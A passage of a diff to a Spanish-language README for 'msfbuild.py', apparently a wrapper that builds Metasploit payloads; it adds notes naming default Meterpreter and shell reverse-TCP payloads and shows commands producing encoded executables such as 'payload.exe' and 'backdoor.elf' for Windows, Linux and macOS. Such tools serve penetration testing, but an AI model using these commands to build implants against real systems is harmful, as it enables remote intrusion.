@@ -61,7 +61,8 @@ options:
 
 ## 💻 Ejemplos
 
-### Generar payload para Windows x86:
+### Generar ejecutable para Windows x86:
+- Por defecto usa el payload: windows/meterpreter/reverse_tcp
 ```
 python3 msfbuild.py \
   --os windows \
@@ -72,7 +73,8 @@ python3 msfbuild.py \
   -o payload.exe \
   -i 10
 ```
-### Generar payload para Linux x64:
+### Generar ejecutable para Linux x64:
+- Por defecto usa el payload: linux/x64/meterpreter/reverse_tcp
 ```
 python3 msfbuild.py \
   --os linux \
@@ -82,7 +84,8 @@ python3 msfbuild.py \
   --lport 8080 \
   -o backdoor.elf
 ```
-### Generar payload para macOS:
+### Generar ejecutable para macOS:
+- Por defecto usa el payload: osx/x64/shell_reverse_tcp
 ```
 python3 msfbuild.py \
   --os macos \
